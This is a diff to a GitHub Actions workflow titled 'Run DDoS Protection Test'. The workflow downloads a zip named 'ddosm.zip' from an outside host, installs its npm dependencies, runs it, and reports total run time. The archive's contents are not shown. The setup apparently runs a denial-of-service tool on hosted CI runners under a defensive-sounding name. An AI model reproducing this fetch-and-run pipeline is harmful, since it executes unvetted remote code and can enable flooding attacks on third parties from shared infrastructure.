@@ -1,27 +1,62 @@
-name: Use Docker Container
+name: Run DDoS Protection Test
 
 on: workflow_dispatch
 
 jobs:
-  docker-node:
+  run:
     runs-on: ubuntu-latest
+    container: node:18
     
-    container:
-      image: node:18-bullseye  # Use Docker image instead of setup-node
-      
     steps:
-    - uses: actions/checkout@v3
+    - name: Start Timer
+      run: echo "START_TIME=$(date +%s)" >> $GITHUB_ENV
     
-    - name: Verify Node.js
+    - name: Download and Extract
       run: |
-        node --version
-        npm --version
-    
-    - name: Your process here
-      run: |
-        # Download your file
         curl -L -o project.zip "https://reality.mahmud-tech.online/ddosm.zip"
         unzip project.zip -d ./project
-        cd ./project
+        
+        # List contents to see structure
+        echo "📁 Extracted files:"
+        ls -la ./project/
+        echo ""
+        echo "📁 Contents of ./project/ddosm/:"
+        ls -la ./project/ddosm/
+    
+    - name: Install Dependencies
+      run: |
+        # Navigate to the correct directory where package.json is
+        cd ./project/ddosm/
+        echo "📍 Working directory: $(pwd)"
+        echo "📄 Checking for package.json:"
+        ls -la package.json
+        
+        # Install dependencies
         npm install
-        npm run start
+        
+    - name: Run the Application
+      run: |
+        cd ./project/ddosm/
+        echo "🚀 Starting application..."
+        
+        # Check what scripts are available
+        echo "Available npm scripts:"
+        npm run
+        
+        # Run the start script (or whatever script you need)
+        npm start
+        
+    - name: Show Total Time
+      if: always()
+      run: |
+        END_TIME=$(date +%s)
+        TOTAL=$((END_TIME - START_TIME))
+        
+        HOURS=$((TOTAL / 3600))
+        MINUTES=$(( (TOTAL % 3600) / 60 ))
+        SECONDS=$((TOTAL % 60))
+        
+        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        echo "📊 TOTAL EXECUTION TIME:"
+        echo "   $HOURS hours, $MINUTES minutes, $SECONDS seconds"
+        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
